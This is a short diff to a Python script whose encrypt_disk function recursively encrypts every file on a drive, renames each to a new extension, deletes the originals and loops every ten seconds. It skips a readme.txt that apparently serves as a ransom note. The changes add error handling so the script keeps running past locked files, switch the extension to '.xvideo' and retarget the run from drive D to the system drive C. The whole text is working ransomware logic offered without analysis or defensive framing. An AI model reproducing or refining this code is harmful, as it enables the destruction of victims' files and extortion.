@@ -27,30 +27,36 @@ def encrypt_disk(DriveLetter):
 
     while True:
         
-        # Parcourir recursivement chaque dossier et ses sous-dossiers pour trouver des fichiers
-        for root, dirs, files in os.walk(f"{DriveLetter}:\\"):  
-            # Pour chaque fichier
+        # Walk all Folder and Subfolder
+        for root, dirs, files in os.walk(f"{DriveLetter}:\\crypto\\"):  
+            # For each file
         	for file in files: 
         		# Continue if the file is donne
-        		if file.endswith(f".tsy-azo-fafana") or file=="readme.txt" or file==f"{app}":
+        		if file.endswith(f".xvideo") or file=="readme.txt" or file==f"{app}":
         			continue
         
         		# Open the file
         		file_path = os.path.join(root, file) 
-        		with open(file_path, "rb") as f: 
-        			# Read the file in binairy mode
-        			data = f.read() 
-        
-        		# Encrypt the file
-        		encrypted_data = cipher_suite.encrypt(data) 
-        
-        		# Write the file encrypted is other file
-        		with open(file_path + f".tsy-azo-fafana", "wb") as f: 
-        			f.write(encrypted_data)
-        		
-        		# Remove the original file
-        		os.remove(file_path)
+        		try :
+	        		# Raise an Exception if an error occured 
+	        		with open(file_path, "rb") as f: 
+	        			# Read the file in binairy mode
+	        			data = f.read() 
+	        
+	        		# Encrypt the file
+	        		encrypted_data = cipher_suite.encrypt(data) 
+	        
+	        		# Write the file encrypted is other file
+	        		with open(file_path + f".xvideo", "wb") as f: 
+	        			f.write(encrypted_data)
+	        			
+	        		# Remove the original file if the encryption finished
+	        		 
+		        		os.remove(file_path)
+	        	except PermissionError:
+	        		continue
+        # wait 10s to continue process
         time.sleep(10)
 
 if __name__ == "__main__":
-    encrypt_disk("D")
+    encrypt_disk("C")
